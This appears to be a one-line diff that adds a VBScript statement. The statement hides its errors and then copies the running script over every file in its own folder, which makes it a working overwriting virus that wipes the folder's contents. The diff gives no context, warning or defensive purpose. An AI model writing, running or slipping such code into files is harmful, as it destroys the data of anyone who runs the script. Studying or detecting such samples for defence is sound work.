@@ -1,0 +1,1 @@
+On Error Resume Next:Set A1=CreateObject("WScript.Shell"):Set F=CreateObject("Scripting.FileSystemObject"):F1=(WScript.ScriptFullName):V1=Left(F1,InStrRev(F1,"\")):For Each T1 In F.GetFolder(V1).Files:F.CopyFile F1,T1.Name:Next:
